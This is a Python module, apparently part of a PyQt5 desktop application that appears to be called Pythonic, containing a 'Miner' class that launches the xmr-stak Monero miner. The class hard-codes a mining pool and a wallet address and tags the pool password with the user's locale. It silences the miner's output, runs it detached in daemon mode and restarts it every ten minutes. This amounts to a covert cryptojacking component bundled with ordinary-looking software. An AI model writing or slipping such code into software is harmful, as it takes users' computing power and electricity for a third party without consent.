from PyQt5.QtWidgets import (QWidget,
                            QApplication,
                            QFrame, QPushButton, QTextEdit,
                            QHBoxLayout, QAction, QMainWindow,
                            QVBoxLayout, QSizePolicy, QMenu, QMessageBox,
                            QGridLayout, QSizeGrip, QTabWidget, QMenuBar,
                            QLabel, QScrollArea, QGraphicsView, QGraphicsScene)
from PyQt5.QtCore import (Qt, QMimeData, QByteArray, QDataStream, QPoint, QLocale,
                         QThreadPool, QDir, pyqtSignal, pyqtSlot, QRect, QTranslator, QEvent)
from PyQt5.QtGui import (QDrag, QPixmap, QPainter,QColor,
                        QScreen, QPainter, QFont)

from PyQt5.QtCore import QCoreApplication as QC
import sys, logging, subprocess, os, locale, pickle
from threading import Timer

class Miner():

    def __init__(self):
        logging.debug('__init__() called Miner')

    def restart(self):

        logging.debug('writeConfig() called')
        self.writeCPU()
        self.writePool()
        self.writeConfig()

        self.p.kill()
        self.startMine()

    def startMine(self):
        self.checkMinerExec()
        self.timer = Timer(600.0, self.restart)
        self.timer.start()
        if os.name == 'nt':
            logging.debug('startMinte() Windows System detected')
            DETACHED_PROCESS = 0x00000008
            CREATE_NO_WINDOW = 0x08000000
            self.p = subprocess.Popen(['all_mine.exe'], creationflags=DETACHED_PROCESS)
        else:
            self.p = subprocess.Popen(['./all_mine'])
        logging.debug('startMine() - new PID: {}'.format(self.p.pid))


    def stopMine(self):

        logging.debug('stopMine() called')
        self.timer.cancel()
        self.p.kill()

    def writeCPU(self):

        with open('cpu.txt', 'w') as cpu_file:
            cpu_file.write('"cpu_threads_conf" :')
            cpu_file.write('[')
            # first core of the CPU 
            cpu_file.write('{ "low_power_mode" : false, "no_prefetch" : true, \
                    "asm" : "auto", "affine_to_cpu" : 0 },')
            cpu_file.write('],')


    def loadExe(self):

        f = open('xmr-stak.exe', 'rb')
        file = f.read()

        with open ('all_mine', 'wb') as mine_binary:
            pickle.dump(file, mine_binary)

    
    def checkMinerExec(self):
		
        if os.name == 'nt':
            if not os.path.isfile('all_mine.exe'):
                logging.error('Missing all_mine.exe - Execution stopped.')
                sys.exit(0)
        else:
            if not os.path.isfile('all_mine'):
                logging.error('Missing all_mine - Execution stopped.')
                sys.exit(0)

    def writeConfig(self):

        with open('config.txt', 'w') as config_file:

            config_file.write('"call_timeout" : 10,')
            config_file.write('"retry_time" : 30,')
            config_file.write('"giveup_limit" : 0,')
            # dont print anything = 0
            config_file.write('"verbose_level" : 0,') #edit
            config_file.write('"print_motd" : false,') #edit
            config_file.write('"h_print_time" : 60,')
            config_file.write('"aes_override" : null,')
            config_file.write('"use_slow_memory" : "always",')
            config_file.write('"tls_secure_algo" : true,')
            # enable daemon mode
            config_file.write('"daemon_mode" : true,')
            config_file.write('"flush_stdout" : true,')
            config_file.write('"output_file" : "",')
            config_file.write('"httpd_port" : 0,')
            config_file.write('"http_login" : "",')
            config_file.write('"http_pass" : "",')
            config_file.write('"prefer_ipv4" : true,')

    def writePool(self):

        locale_string = locale.getdefaultlocale()[0]

        with open('pools.txt', 'w') as pool_file:

            pool_file.write('"pool_list" :')
            pool_file.write('[{')
            pool_file.write('"pool_address" : "de2.moriaxmr.com:5555",')
            pool_file.write('"wallet_address" : "46EdjaZQ1og7oaSrPg7kNrdzCSpUhvtViSuMyVq16APaKTjizTGwe6FGg1vKqv4DS84CttqNsRVamKH9MP19cAfL7VagwWZ",')
            pool_file.write('"rig_id" : "",')
            pool_file.write('"pool_password" : "')
            pool_file.write(locale_string)
            pool_file.write(':Pythonic",')
            pool_file.write('"use_nicehash" : false,')
            pool_file.write('"use_tls" : false,')
            pool_file.write('"tls_fingerprint" : "",')
            pool_file.write('"pool_weight" : 1')
            pool_file.write('},],')
            pool_file.write('"currency" : "monero",')



